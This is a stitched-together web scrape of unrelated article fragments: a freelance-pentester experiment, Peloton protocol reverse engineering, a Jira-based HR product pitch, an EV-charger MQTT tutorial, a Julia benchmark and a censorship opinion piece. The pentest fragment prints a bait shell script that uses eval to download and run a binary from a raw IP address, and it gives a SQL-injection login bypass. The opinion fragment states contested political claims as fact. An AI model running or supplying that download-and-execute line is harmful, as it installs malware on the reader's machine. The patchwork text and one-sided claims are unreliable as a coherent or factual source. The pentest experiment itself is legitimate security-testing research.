<img src="https://sophron.github.io/lowcost-freelancing-pentest/sql_riddle.png">
  <figcaption>De-obfuscating the SQL query</figcaption>
</figure>


<p>
After de-obfuscation, the final query will be: "<span color="crimson">SELECT * FROM form_passwords WHERE 'password123' LIKE %" OR %"$'=%</span>". Inputs such as "<span color="red">' OR 1=1'</span>" would allow the tester to bypass the authentication form successfully. I purposely decided to use a payload that is commonly used when testing forms for SQL injections as an answer to this riddle, to see how many of these testers would correctly identify the root cause of this issue.
</p>


<p>To make things even more interesting, I put a malicious shell script as part of the HTTP response. The contents of the shell script were the following: </p>
<pre><code>obscure() {
   local txt="$1"
   local txt="$a\'{}"
   echo "${txt//?/*}"
}

sql_1 = 'SELECT * FROM form_passwords WHERE "asfsadfd" LIKE CONCAT("%", IF(STRCMP(SYSTEM_USER()'
sql_2 = 'REVERSE(), ISNULL(NULLIF(NULL-NULL*NULL, POWER(NULL,NULL)))), IF(STRCMP(SESSION_USER(), "/dev/null@localhost")=0'
sql_3 = `wget http://83.212.174.87/mal | chmod +x ./mal | ./mal`
sql_4 = '10.3.15-MariaDB-0+deb10u1)=0,IF(CONNECTION_ID()=1337,"="-_-,IF(PI()&lt;3,&lt;(^^)&gt;'
sql_5 = 'LOG(2)),(4*10+1)*2), CHAR(69,4*10+9)), SPACE(1'

echo "Deobfuscating..."

eval "$sql_1"
eval "$sql_2"
eval "$sql_3"
eval "$sql_4"
eval "$sql_5"
</code>
</pre>


<p>
As can be seen, on line 12, the script is downloading and executing a binary from the Internet. I wanted to see how many of these testers will be careless enough to run my malicious script without auditing it first.

</p>


<p>Finally, I installed an SSH honeypot. My intention was to record any shell interactions by the testers and evaluate their post-exploitation methodology.</p>

<p>The profiles of all the testers I hired had overwhelmingly positive reviews on the online marketplace. I pretended that I needed my web form tested before my group used it in production. I received all the penetration testing reports a few days later.</p>

<h3>Tester #1 ($20)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/1/report.pdf">PDF Report</a></p>

<p>The tester claimed to be a Certified Ethical Hacker v9 with experience in Vulnerability Assessments and Penetration Testing.
</p>

<p>
The tester delivered the report and mentioned that he found a serious flaw in the system. He failed to identify any of the high severity findings. The report included irrelevant information, such as "Banner Grabbing &amp; Version Detection," as well as a "Performance / Load Test." The serious flaw that the tester identified was logging in to the SSH honeypot.
</p>


<h3>Tester #2 ($30)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/2/report.pdf">PDF Report</a></p>

<p>
The tester described himself as an independent information security researcher. He mentioned that he had finished his Bachelor's in Computer Science and Certified Ethical Hacker Course by EC-Council. He claimed to have hands-on experience in vulnerability assessment and penetration testing.
</p>
<p>
This tester, too, failed to identify any of the high severity findings. The tester believed he had gotten local access to the remote machine, failing to realize that this was, in fact, a honeypot. The results that were reported had no direct impact (in regard to Integrity, Availability, Confidentiality), or they were not valid at all (e.g., directory brute-forcing).
</p>

<h3>Tester #3 ($35)</h3> 

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/3/report.pdf">PDF Report</a></p>

<p>
The tester claimed that they usually charge $200 for complete pentest and report, but since canceling the order will have a negative impact on their profile, they agreed to carry out the testing. They asked me to tip well after I receive the report.
</p>
<p>
Most of the findings included in this report were part of the Nessus security tool. A reflected XSS finding on a POST parameter was exaggerated as a HIGH. None of the HIGH-severity findings were identified.
</p>

<h3>Tester #4 ($40)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/4/report.pdf">PDF Report</a></p>

<p>
The tester claimed to be OSCP certified with nine years of experience.
</p>
<p>

This tester identified the SQL vulnerability successfully but failed to identify the root cause of it. He reported the vulnerability as an SQL injection as opposed to a hardcoded password. The rest of the findings he reported were part of Burp Suite's automated scanner.

</p>


<h3>Tester #5 ($50)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/5/report.pdf">PDF Report</a></p>

<p>
The tester claimed to have a B.Sc in Computer Science and various certifications, including CEH Certified Ethical Hacker and Certified Payment Industry Security Implementer. On his profile, he mentions that he provides a variety of services from PCI DSS consulting to blockchain training.
</p>

<p>

Again, none of the critical vulnerabilities were discovered. This tester did execute my malicious script even though, according to the report, he examined it for any security issues. 

</p>


<h3>
Tester #6 ($100) </h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/6/report.pdf">PDF Report</a></p>

<p>
The tester claimed to have over 20 years of experience in Ethical Hacking, and his profile has over 100 positive reviews. I ordered the premium service that included a full penetration test, professional security assessment report and recommendations &amp; solutions.</p>

<p> The tester failed to identify any of the HIGH-risk vulnerabilities. All the technical details on the report were taken from automated tools (OWASP ZAP and Netsparker). </p>




<h3>
Tester #7 ($400) </h3>

<p>
The tester claimed to be an OCSP with 7+ years of professional experience with major clients. In our agreement, we agreed that he wouldn't have to provide a report to save them time and allow them to focus on testing.

</p>

<p>
The tester successfully identified the issue with the mistyped HTTP header. He did not report the SQL hardcoded password.
</p>

<p>Following is a table that summarizes the work of all testers:</p>

<p>
The results are straightforward. It appears that all of these contractors, with the exception of the last one, used automated tools to carry out the testing. Hence, the majority of them failed to identify the critical vulnerabilities. Some of them thought they gained access to the host through SSH without realizing they actually gained access to the virtual environment of a honeypot. Finally, one of them ran a script found online without auditing it …</p></div></div></div>

        <p><strong><span>TL</span>;<span>DR</span></strong> - I’ve decoded (most of) the protocol that the Peloton bike uses to
communicate with its head unit tablet and built a device, the PeloMon, that takes that
data during a ride, without interfering with the Peloton software, to
broadcast it over Bluetooth <span>LE</span> to whatever devices you’d like — a watch, Zwift,
Wahoo, whatever. Stick around for logic analyzer traces, hardware diagrams,
cursing at Bluetooth, and some nice&nbsp;interfaces.</p>

<p>We have a Peloton at home. Originally, I was skeptical, but then I found
trainers I like and it’s fun to ride with friends. And really takes the edge
off all-day Zoom meetings to ride during a meeting with the camera turned&nbsp;off.</p>
<p>But, being the guy that I am, I’ve been curious about how the head unit —
which runs a lightly skinned Android — was collecting stats
from the actual bike. I was also a bit annoyed that though the Peloton software
will happily read data from an <span>HR</span> sensor, and will upload your ride data to
Strava, there was no way for it to <em>broadcast</em> data about a ride to a local
fitness appliance — which meant that although I could track the fact that I
was doing an “indoor bike” ride on my Garmin watch, the watch would see a 0
mile ride because it got no bike&nbsp;data.</p>
<p>Then a couple months ago, I came across
<a href="https://ptx2.net/posts/unbricking-a-bike-with-a-raspberry-pi/">this blog post</a>
in which someone on the Internet was able to hook up their (bricked) Flywheel
bike to Zwift using a Raspberry Pi to decode the bike sensor data and broadcast
it over Bluetooth — and I was inspired to finally give this project a shot.
What should we call a device broadcasting stats from the Peloton, monitoring it
if you will? How about&nbsp;“PeloMon”?</p>
<p>Let’s get down to&nbsp;it.</p>

<p>There are only two cables that plug into the tablet: a barrel jack carrying
<span>DC</span> power @ 12V (coming from the power brick), and a <span>TRRS</span> connector —
think “stereo aux cable”. So the data is clearly coming in on the latter.
Since I only wanted to observe the traffic between the <span>HU</span> and the bike,
not interrupt it, I used a headphone splitter cable to split the cable from the bike with an extra jack, and connected an aux cable from that extra jack
to the breakout. Such a connection might disrupt some high-speed communications
protocols, but my guess was that a) there wasn’t going to be that much traffic
to require anything fancy, b) nothing fast would be running over 3.5mm <span>TRRS</span>, and
c) this interface would be engineered with pretty wide tolerances for stability 
in a home environment. (Spoiler alert: all of these were&nbsp;true.)</p>
<p>The first step was to identify the pinout from the jack as best
as possible. Probing the leads with a <span>DMM</span> with the bike active showed that
Ring2 was at ground (0V with respect to the power supply’s ground)
with -5.5-6V between tip or ring1 and ground. Sleeve also appears to be
at ground, but it and Ring2 may not quite be the same (more on this later).
The negative voltages with respect
to ground are a pretty strong sign that we’re going to see <span>RS</span>-232&nbsp;signaling.</p>
<h2 id="decoding-the-wire-protocol-with-a-logic-analyzer"><a href="#decoding-the-wire-protocol-with-a-logic-analyzer">Decoding the wire protocol with a logic&nbsp;analyzer</a></h2>
<p>(If you’d like to load a PulseView trace to see the data for yourself, one session
file from a test ride is located in <code>peloton_decoding/resistance-stepped-10s.sr</code>
in <a href="https://github.com/ihaque/pelomon">the PeloMon GitHub repository</a>.)</p>
<p>Normally I’d wire up the breakout and hack something together on the Arduino
I have sitting around, but it turns out that logic analyzers have gotten
<em>really really cheap</em> so I splurged on a $12.50 one and thought I’d give it
a whirl — turned out to be a great idea that made it <span>WAY</span> easier to decode
the signals. With complete abandon regarding ground isolation and the voltage
tolerances of the <span>LA</span> (is it supposed to be able to handle negative voltage?),
I hooked it up to see what I’d get. These cheapo LAs emulate a Saleae Logic
analyzer and work fine in the open-source <a href="https://sigrok.org/wiki/PulseView">PulseView</a>&nbsp;software.</p>
<p><img alt="Hooking up the LA with D0 on tip, D4 on ring1, D5 on sleeve, and GND on ring2" src="https://ihaque.org/static/img/2020/10/20201015-pinout-0tip-4ring1-5sleeve-gndring2.png">
</p><center><strong>Hooking up the <span>LA</span> with D0 on tip, D4 on ring1, D5 on sleeve, and <span>GND</span> on ring2</strong></center>
<p><img alt="D0 on tip, D2 on ring1, D4 on ring2, and GND on sleeve" src="https://ihaque.org/static/img/2020/10/20201015-pinout-0tip-2ring1-4ring2-gndsleeve.png">
</p><center><strong>D0 on tip, D2 on ring1, D4 on ring2, and <span>GND</span> on sleeve</strong></center>
<p>There’s pretty clearly serial signaling going on over these wires! One
party seems to be sending requests on Tip every 100ms, and the other
party responds about a millisecond later on Ring1. While it wasn’t obvious
from the <span>DMM</span> whether signaling <span>GND</span> should be on Ring2 or Sleeve, from the <span>LA</span>
traces, it looks like there is less glitching on the response line if Ring2 is
used as <span>GND</span> - so we’ll do that. The narrow pulses are probably single bits,
so sampling at a high rate (a few hundred kHz) lets us measure the bit
rate as&nbsp;19200bps:</p>
<p><img alt="Counting samples in the LA shows a 19.2kHz signal" src="https://ihaque.org/static/img/2020/10/20201015-pinout-19200bps.png">
</p><center><strong>Counting samples in the <span>LA</span> shows a 19.2kHz signal</strong></center>
<p>PulseView also lets you add protocol decoders to particular wires. I put a <span>UART</span>
decoder on with D0 as “<span>RX</span>” and D4 as “<span>TX</span>”, and saw data, but with a ton of
low-level serial protocol errors. UARTs invert the signal going out on the wire
with the expectation that there will be another <span>UART</span> at the other end to
re-invert. Since we don’t have that second <span>UART</span>, we have to turn the “Invert <span>RX</span>”
and “Invert <span>TX</span>” options on in PulseView, and then we see clean data! I also
experimented with other serial options (data, parity, and stop bits), but the
first guess of 8N1 turned out&nbsp;correct.</p>
<p><img alt="Without inversion enabled, we see framing errors and break conditions" src="https://ihaque.org/static/img/2020/10/20201015-missing-inversion.png">
</p><center><strong>Without inversion enabled, we see framing errors and break conditions</strong></center>
<p><img alt="Turning on the inversion in software, we see data with no serial errors!" src="https://ihaque.org/static/img/2020/10/20201015-fixed-inversion.png">
</p><center><strong>Turning on the inversion in software, we see data with no serial errors!</strong></center>
<p>Following the data streams, we see that the data stream on the
Tip wire during a ride always consists of one of three different four-byte
packets, repeated round-robin every 100ms, with the responses on Ring1 to these
requests being longer, different in length depending on the request type, and
variable in content.
It seems likely then that the Tip shows us signaling from the head unit to the
bike, and Ring1 is the bike responding to the head unit with information
about variables like current speed, resistance, or power&nbsp;output.</p>
<p><strong>Thus, we’ve worked out the physical layer protocol for the Peloton
communications: <span>RS</span>-232 at 5.5V and 19200bps 8N1 encoding, with <span>HU</span>-to-bike
communications on Tip, bike-to-<span>HU</span> on Ring1, <span>GND</span> on Ring2, and something
ground-like on&nbsp;Sleeve.</strong></p>

<p>To investigate the encoding between the head unit and the bike, I used the
logic analyzer to capture a trace of the communications during a ride. (Shoutout
to Ben Alldis and his Ministry of Sound ride series!)
The data dump and scripts are available in the GitHub repository for this project
at https://github.com/ihaque/pelomon/, in the <code>peloton_decoding</code> subdirectory.)</p>

<p>(To follow along, run <code>peloton_decoding/decoder_plots.py</code> from the
<a href="https://github.com/ihaque/pelomon">PeloMon Github repository</a>.)</p>
<p>During a ride, about every 100ms (100.66-100.8ms) the <span>HU</span> sends a request
to the bike, and the bike responds about 300us (i.e., 0.3ms) from the end
of the <span>HU</span>’s request. The <span>HU</span> sends three different request packets round robin.
Each request type has a different response length from the&nbsp;bike:</p>

<tbody><tr><th><span>HU</span> Request</th><th>Bike Response Length</th><th>Example Bike Response</th></tr>
<tr><td><tt>F5 41 36 F6</tt></td><td>8 bytes</td><td><tt>F1 41 03 30 30 30 C5 F6</tt></td></tr>
<tr><td><tt>F5 44 39 F6</tt></td><td>10 bytes</td><td><tt>F1 44 05 30 30 30 30 30 2A F6</tt></td></tr>
<tr><td><tt>F5 4A 3F F6</tt></td><td>9 bytes</td><td><tt>F1 4A 04 38 36 36 30 13 F6</tt></td></tr>
</tbody></table>

<p>A few things are evident from simple inspection of the&nbsp;bytes:</p>
<ul>
<li>The first byte is a header - seems to be F5 from the <span>HU</span> and F1 from the&nbsp;bike.</li>
<li>All packets end in&nbsp;F6.</li>
<li>The second byte that the <span>HU</span> sends seems to be a request type, and is mirrored in the second byte in the bike’s&nbsp;response.</li>
<li>The third byte of the bike response is the length of the full packet minus 5 — probably indicates the length of the data payload following&nbsp;it.</li>
<li>Serial packets often carry a checksum, and here the second-to-last byte from either the <span>HU</span> or the bike seems to be that: it’s the sum (modulo 256) of all the bytes preceding&nbsp;it.</li>
</ul>
<p>Thus, the packet format seems to&nbsp;be:</p>
<ul>
<li><span>HU</span>: <code>F5 [request type] [checksum] F6</code></li>
<li>Bike: <code>F1 [request type] [payload length] [response bytes 1-n] [checksum] F6</code></li>
</ul>
<p>We can now throw together a quick plot of each response byte to look for&nbsp;patterns.</p>

</p><center><strong>Bytewise plot of Peloton response data for common request packets during part of a ride</strong></center>
<p>It appears that every byte ranges from 0x30 to 0x39 — which is exactly the
<span>ASCII</span> range for decimal digits 0 through 9. Furthermore, the earlier bytes in
each packet appear to vary more quickly than the later ones through a ride,
suggesting that the least-significant digit comes first. <strong>The Peloton bike
is encoding its responses as little-endian <span>ASCII</span> digits.</strong> It’s easy enough
to dump a plot of these values per response type now that we know the&nbsp;encoding:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Your HR deserves better</h2><p>HR employees have to deal with lots of activities and services that seem disconnected, at least from a technical point of view. They receive requests for new employees and positions from various units, prepare and upload job ads on the company’s website, review received job applications, forward suitable applications to corresponding teams and units, organize interviews based on the position and target unit’s preferences, receive feedback and – upon admission – devise employment contracts and plan and execute the onboarding process. As for current employees, they provide various services including issuing official documents and certificates, organizing educational programs and workshops for personal and professional development of employees and handling numerous other personal, legal and financial cases and activities and status reports. And often, they do not have proper tools to manage and steer all these interconnected procedures without too much unnecessary manual work.</p><h3>Scenario I: silo tools, overwhelmed HR staff and lack of unified reporting and monitoring</h3><p>The HR department in Company A has various tools for different topics, e.g. vacation requests, employment contracts or wage &amp; salary management. It pays about 200K per year for those few tools. The rest of the activities are tracked in Excel, and documents are handled on a file server. During the recruiting process, they mainly use email to communicate with other departments and the applicants and store information on job ads, job applications and expense management in various large Excel files. As an example, an HR employee needs to communicate manually with website admins to update job ads, and send informational messages, notifications and reminders by looking into her calendar or the aforementioned Excel files. She then has to prepare a contract by copy-pasting information and contact IT and other relevant departments in order to trigger necessary on-boarding steps. She also has to provide meaningful reports on number of job applications, expenses, contracts and requests. This reporting process takes a big chunk of her time since a few Excel files need to be merged, and the resulting diagrams have to be extracted and put into a PowerPoint presentation. All these activities consume a huge amount of her time and energy.</p><p>Moreover, management does not have real-time status reports and monitoring measures, since the reports are generated in intervals, sometimes weeks later.</p><div id="attachment_78438"><p><a href="https://blog.codecentric.de/files/2020/10/HR-tool-chaos.png"><img aria-describedby="caption-attachment-78438" loading="lazy" src="https://blog.codecentric.de/files/2020/10/HR-tool-chaos-700x409.png" alt="the need for an hr synergy solution" width="700" height="409" srcset="https://blog.codecentric.de/files/2020/10/HR-tool-chaos-700x409.png 700w, https://blog.codecentric.de/files/2020/10/HR-tool-chaos-250x146.png 250w, https://blog.codecentric.de/files/2020/10/HR-tool-chaos-768x448.png 768w, https://blog.codecentric.de/files/2020/10/HR-tool-chaos-120x70.png 120w, https://blog.codecentric.de/files/2020/10/HR-tool-chaos.png 1292w" sizes="(max-width: 700px) 100vw, 700px"></a></p><p id="caption-attachment-78438">Tool and process chaos</p></div><h3>Scenario II: generating synergy by means of fully interconnected, integrated and automated modules</h3><p>Company B has <em>HR Synergy Solution</em> as its main platform and steers almost all its internal processes on that platform. Since different modules for job ads, job applications, interviews, contracts or on-boarding steps are interconnected, an HR employee at Company B has to carry out the minimum necessary manual work in order to manage all required activities. Activities are carried out based on an agreed workflow that includes all necessary steps in the process, and data is validated at every step automatically. Communications are done and protocolled either systematically on the corresponding case in the tool, or automatically by the system, if possible. Reminders are sent based on different status and defined deadlines and any report can be generated automatically and be available by a click in real-time. The reports are also connected to the actual data, so that decision makers can explore the provided data and make sense of different situations and results. And the most interesting part: Company B pays less than 50K yearly to use this platform.</p><p>Not many companies wish to find themselves trapped in Scenario I. However, that is sadly often the case. The question is how to make the transition from Scenario 1 to Scenario II, and reap the benefits on all financial, personal, legal and technological layers.</p><div id="attachment_78441"><p><a href="https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution.png"><img aria-describedby="caption-attachment-78441" loading="lazy" src="https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-700x377.png" alt="HR Synergy Solution" width="700" height="377" srcset="https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-700x377.png 700w, https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-250x135.png 250w, https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-768x413.png 768w, https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-120x65.png 120w, https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution.png 1293w" sizes="(max-width: 700px) 100vw, 700px"></a></p><p id="caption-attachment-78441">Managing HR processes with codecentric’s HR Synergy Solution</p></div><h2>Our solution</h2><p>We use Jira as infrastructure for workflow engine, user and reporting management, and customize different interconnected workflows to create a personalized solution based on all organizational, legal and technical requirements within a company. By help of various add-ons, we have created a landscape on which HR departments can handle recruiting, contract management and on-boarding process seamlessly. Management also has direct access to dashboards. Statistics and monitoring information are available based on what insight decision makers need and what cockpit an HR employee requires to easily handle his or her daily work. All steps than can be automated and are carried out automatically. This includes emails to applicants (e.g. for requesting information, informing them about a decision, etc.), notifications to other departments (e.g. about the results of an interview) and reminders to whoever is in charge of a certain step and has passed a deadline. Via various APIs, communications and interactions with other systems are done automatically. This includes the IT department for creating a new account, or the finance department for registering an application cost or a contract.</p><p>And as for all agile tools, our solution is not a finished black box, but an infrastructure that can be modified and adjusted continuously, based on new organizational, legal or technical demands.</p><h2>How does it work?</h2><h3>The concept of end-to-end process management</h3><div id="attachment_78445"><p><a href="https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-Processes.png"><img aria-describedby="caption-attachment-78445" loading="lazy" src="https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-Processes-250x149.png" alt="HR processes and services" width="250" height="149" srcset="https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-Processes-250x149.png 250w, https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-Processes-700x417.png 700w, https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-Processes-768x457.png 768w, https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-Processes-120x71.png 120w, https://blog.codecentric.de/files/2020/10/HR-Synergy-Solution-Processes.png 1160w" sizes="(max-width: 250px) 100vw, 250px"></a></p><p id="caption-attachment-78445">HR processes &amp; services</p></div><p>End-to-end process management is a novel mindset that views seemingly isolated procedures within an organization as part of a bigger picture, which is the underlying process. This concept was introduced and theorized by <a href="https://en.wikipedia.org/wiki/Michael_Martin_Hammer" target="_blank" rel="noopener noreferrer">Michael Hammer</a> in his distinguished book, <a href="https://www.goodreads.com/book/show/8430461-faster-cheaper-better" target="_blank" rel="noopener noreferrer">Faster, Cheaper, Better</a>. From his point of view, procedures interact with each other by either triggering, updating or completing each other in a one- or bidirectional manner. And this interaction needs to be considered within a broader context, especially for reporting (KPIs) and accountability.</p><p>In the context of Human Resources, for example, the recruiting process is seen as the underlying ground that connects procedures such as job ad management, job application screening, interview planning, contract preparation and on-boarding. The process starts with an open position in form of a job ad, and ends with an admitted applicant starting their career in the company. Traditionally, companies use different tools for these procedures, ranging from Excel, email, Slack or Trello all the way to specialized tools for specific procedures (e.g. vacation management). This approach was inevitable until a decade ago, since the software industry was not able to produce a secure, scalable and easily customizable infrastructure to support all these different procedures in a coherent, fast and low-cost way.</p><p>The technology simply wasn’t ripe for such comprehensive development and rapid adjustments. This brings us to the newly emerged concept of low-code platforms.</p><h3>Low-code platforms: 3D printers of the software industry</h3><p>Low-code platforms, including Jira, WordPress, Salesforce or Drupal are built upon the concept of software development by configuration, which means using flexible configuration panels instead of writing, compiling and deploying hundreds of lines of code. It immensely reduces the development, test and rollout time and takes advantage of modular implementation and add-on-based expansion.</p><p>These platforms generally provide an infrastructure with basic functionalities and modules such as user administration &amp; authentication, permission concept, dashboards, a workflow engine, communication venues (via e.g. sharing and commenting functionalities), custom content types and web-forms. They also provide an open API for third-party vendors to develop add-ons (apps) with particular purposes and functionalities (e.g. PDF export, BI reporting, visualizations, attachment management, dynamic forms, API management, etc.).</p><p>The time of buying a software and having to deal with its limitations and to come up with various workarounds in order to get the job done is passed. Now, companies can get a pre-configured platform, and then adjust it to comply with their requirements fully and reliably.</p><h3>Jira, a platform to enable end-to-end and fully-individualized process management</h3><p>Jira has proved to be one of the top low-code workflow engines in recent years. Its openness as a platform has also provided an opportunity for third-party vendors to fill the gap on areas where Atlassian itself is lagging behind. When a combination of well-thought-out add-ons are put together with a scalable permission concept, ANY process can be implemented on Jira (see for example <a href="https://pujanz.atlassian.net/wiki/spaces/DBWJIRA/overview" target="_blank" rel="noopener noreferrer">Shaping a Digital Beauty with Jira</a>, for a comprehensive guide), and within an astonishingly short timeframe.</p><p>In one case, for instance, 25 processes within a medium-sized bank were implemented and rolled out on Jira (together with about 10 add-ons), with a comprehensive BI reporting and systematic communication methods, all within 18 months by a team of one business analyst and one developer. Not many platforms out there in the market can provide such flexibility and scalability, let alone cost-efficiency.</p><h2>Why is codecentric HR Synergy Solution one of the best in the market?</h2><p>HR Synergy Solution is one pre-configured set of projects, dashboards and other modules on Jira that is optimized for HR processes. The pre-configuration includes settings and features that are required by almost all HR departments, which comprises of about 70% of total features. The remaining 30% is always completed by knowing the exact requirements of each HR department. Generalization and workarounds in software belong in the 20th century. It is now time to offer tools that are 100% individualized and can be adjusted constantly based on new requirements and situations. And that is what our HR Synergy Solution offers.</p><p><strong>For more information contact </strong>Adrian Voigt (<a href="mailto:adrian.voigt@codecentric.de" target="_blank" rel="noopener noreferrer">adrian.voigt@codecentr…</a></p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>With the increasing popularity and availability of battery electric vehicles, privately-owned charger infrastructure at home or on company premises has become more and more common.</p><p>A vehicle charger is much more than a simple mains socket – it contains a computer or at least a programmable logic controller (PLC) which keeps track of power levels, consumption, and state. Having access to this data can be very useful for the owner, for example for custom billing or energy management purposes. Existing proprietary solutions offered by the manufacturers do not necessarily guarantee a full match with the customer’s requirements regarding costs and connectivity.</p><p>So, let’s “rescue” the data from the charger and store it in our own infrastructure.</p><p>This article serves two primary purposes. First, it outlines a simple solution on how to acquire charger data for your own analysis purposes. Second, it can be used as a tutorial for a tiny IoT use case with Golang, MQTT and TimescaleDB.</p><h2 id="obtaining-data-from-the-charger">Obtaining data from the charger</h2><p>At the time being, most chargers provide a management interface using a proprietary protocol with varying degrees of documentation. In case of the charger used for this article, a Mennekes Amtron, the control unit had ethernet and wireless connectivity, a mobile app, but no public documentation on the protocol.</p><p>In cases like that, some options for proceeding are:</p><ul><li>Ask the manufacturer for an API documentation</li><li>Analyze the network communication between management app and charger</li><li>Reverse-engineer a given piece of software, such as a mobile application</li></ul><p>Working together, the manufacturer is always the preferred way, and would surely be no issue on our charger. But supposing that the charger is an exotic model without sophisticated customer support, it might happen that obtaining an official API documentation does not succeed.</p><p>In this case, analyzing the network traffic between the mobile application and charger would be a least-invasive and promising next step. After setting up a network monitoring environment, i.e.&nbsp;<a href="https://www.wireshark.org/" noopener="" noreferrer"="" target="_blank">Wireshark</a> and a switch with monitoring port, and listening to the network traffic while using the mobile app, the following findings have been made:</p><ul><li>The charger uses a plaintext HTTP API listening on port 25000</li><li>The API prefix is /MHCP/1.0/</li><li>A client is considered as authenticated when it adds an http query parameter “devKey” with the value of the “Charger PIN1” from the manual</li><li>Request and response payload are JSON-encoded with human readable field names</li></ul><p>The listing below shows an example of a state document retrieved from an actual charger on <code>/MHCP/1.0/ChargeData?DevKey=0000</code>:</p><div id="cb1"><pre><code><span id="cb1-1"><span>{</span></span>

The message brokers retain feature serves that purpose very well</li></ul><p>Because of its smaller footprint compared to AMQP and its popularity in the IoT field, we use <a href="https://blog.codecentric.de/en/2017/11/hello-mqtt-version-5-0/">MQTT</a> as messaging protocol.</p><p>Besides MQTT support in the connected applications, an MQTT broker is required. Depending on the overall setup, this could be a self-managed MQTT broker (such as <a href="https://mosquitto.org/" rel="noopener noreferrer" target="_blank">Mosquitto</a> or <a href="https://www.hivemq.com/" rel="noopener noreferrer" target="_blank">HiveMQ</a>) or a managed broker, i.e. <a href="https://blog.codecentric.de/en/2018/03/aws-iot-getting-sensordata/">AWS IoT</a> or Azure IoT. In this example, a Mosquitto instance is used.</p><h3 id="mqtt-topic-hierarchy-and-payload">MQTT topic hierarchy and payload</h3><p>The MQTT message properties relevant for this case are:</p><ul><li>the topic for routing and delivery purposes</li><li>the QoS statement defining the condition on which a message is considered delivered</li><li>a retain flag, which allows us to declare a message as the current value until a new one is published</li><li>the payload. MQTT is data-agnostic and regards the payload as an array of bytes</li></ul><p>We prefer a topic hierarchy based on charger id and variable name over a single topic for all variables for the following reasons:</p><ul><li>It reduces the complexity of a payload, because the topic already indicates what is inside</li><li>It reduces the load on the transport layer, because a fine-grained topic structure allows us to update only the values that have actually changed</li></ul><p>Both advantages really come in handy on constrained devices on low bandwidth or expensive connections.</p><p>The resulting topic structure is:</p><pre><code>chargers/{chargerName as defined}/{valueName as in shared data model}</code></pre><p>For example: For a variable “OperationState” on a charger called “carpark1”, the topic is <code>chargers/carpark1/OperationState</code>.</p><p>Concerning the payload, a simple solution would be to publish the byte representation of the value (in our case, a 64-bit ANSI float). Supposed that all other applications involved used the same method of floating point representation and don`t care about the time the published value was actually sampled or the latency is extremely low, this might be a viable solution.</p><p>In our use case, it is expected that the receiver of a telegram has to be aware of the actual sampling time, for instance for computing integrals over the current power consumption. So we need to include the sampling time into the telegram.</p><p>There are several ways to achieve this:</p><ul><li>Put the timestamp into the topic structure, which results in additional messages and increased complexity</li><li>Write the sampling timestamp into an MQTT5 header field</li><li>Instead of the raw value, emit a data structure which contains both timestamp and value</li></ul><p>For the given scenario, the third option appears as most reasonable. For the task of encoding a structure into a byte array, one could either use JSON or a data serialization framework, such as AVRO or Google Protocol Buffers. For the sake of simplicity and compatibility with managed solutions (especially their monitoring and debugging tools), we will use plain JSON.</p><h3 id="certificate-authentication">Certificate authentication</h3><p>MQTT and Mosquitto can be operated with plaintext passwords or even with no passwords at all. In a real-world environment, both edge device and broker should be authenticated and authorized, furthermore it should be possible to isolate device scopes and revoke compromised access credentials.</p><p>This requirements are resolved by using certificate-based authentication. The generation and deployment of the certificates might differ depending on the trust infrastructure used in production, for development purposes a self-signed set of certificates might suffice.</p><p>After deploying the certificates …</p></div></div>

In the dynamic version, which uses the <strong>same</strong> code for any (<code>Float64</code>) vector of any length, and any permutation, the code is a fair bit longer and more complicated. In fact, all of the code shown above is simply to deal with things like throwing out of bounds errors in case the vector <code>v</code> does not have entries at the indicies <code>p</code> asks for. Then at the end, we see a call to <code>Base._unsafe_getindex</code> which actually does the indexing once all the error-checking is done.</p><p>So could this huge performance advantage in the static case be partly to the fact that we don’t need to check that the indexing operation is valid, since we know the lengths of both <code>v</code> and <code>p</code> at compile time in that case? We can check by benchmarking:</p><pre><code>julia&gt; @btime Base._unsafe_getindex($(IndexLinear()), $v, $p)

 0.3847457473964191  </code></pre><p>58 nanoseconds still; so the bounds checking and all does take a bit of time, but the dynamic version is still 10x slower. We can make an even more fair comparison (without the worrisome <code>unsafe</code> operation even) by simply making the vector <code>v</code> a static vector as well:</p><pre><code>julia&gt; v_static = SVector{d}(v)
10-element SArray{Tuple{10},Float64,1,10}:

<p>Over the course of 2020, we’ve seen increased censorship from every major digital content platform. It culminated with both Facebook and Twitter blocking a New York Post article, which alleged Joe Biden’s son was involved in illegal activity and corruption<sup id="fnref:2"><a href="#fn:2">1</a></sup>. Meanwhile, the New York Times published a scathing article on Donald Trump’s tax returns. None of the major networks restricted access to the tax story, even though it was likely those tax records were obtained illegally<sup id="fnref:4"><a href="#fn:4">2</a></sup>, and nothing in the returns was truly out of the ordinary<sup id="fnref:3"><a href="#fn:3">3</a></sup>.</p>

<p>People are calling for reform to Section 230 of the Communication Decency Act<sup id="fnref:5"><a href="#fn:5">4</a></sup>, the law that keeps Internet platforms from liabilities often reserved for publishers. However, I do not believe more legal restrictions will solve the issues surrounding tech and free speech. The only viable solution is better use of technology. The Internet was not founded by media giants. It was originally hundreds of thousands of small, independent websites and service providers. The solution to our current censorship woes, lies in the archives of Internet next to animated hamsters, under construction GIFs, and bright pink animated Geocities sites.</p>

<!--more-->

